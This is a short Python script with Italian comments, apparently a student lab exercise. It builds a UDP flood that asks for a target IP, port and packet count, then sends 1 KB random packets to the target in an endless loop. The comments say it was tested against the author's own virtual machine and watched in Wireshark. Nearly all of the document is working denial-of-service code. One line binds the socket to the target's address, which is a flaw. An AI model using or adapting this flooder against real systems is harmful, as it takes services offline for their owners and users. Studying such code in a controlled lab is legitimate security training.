#L'obbiettivo dell'esercizio di oggi è quello di creare un UDP flood verso una macchina target
#come prima cosa ho importato anche il modulo random per l'invio di pacchetti da 1k
import socket
import random

#Ho definito gli input  cosi da far scegliere all'utente sia l'indirizzo ip che la porta da attaccare
target = input ("\nInserisci indirizzo ip target:")
port = int(input ("\nInserisci la porta target:"))

#Ho definito l'input anche del numero di pacchetti da inviare
n =  int (input ("\n Inserisci numero di pacchetti da inviare:"))

#Ho inserito un ciclo while  uguale a 1 per l'invio ripetitivo  dei pacchetti da 1k cosi da simulare un DOS
while 1:
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       s.bind ((target, port))

       data = random.randbytes(1024)
       addr = (str(target), int(port))

#La funzione for per l'invio dei dati con input in sequenza
       for x in range(n) :
                s.sendto(data, addr)
       s.close()
#Avviato il nostro codice utiliziamo lo stesso ip di questa macchina virtuale 192.168.32.100 con una porta a nostra scelta
#per simulare un attacco DOS con invio di pacchetti UDP, che possiamo verificare attraverso wireshark
#sull'opzione loopback trovandoci in una rete interna 
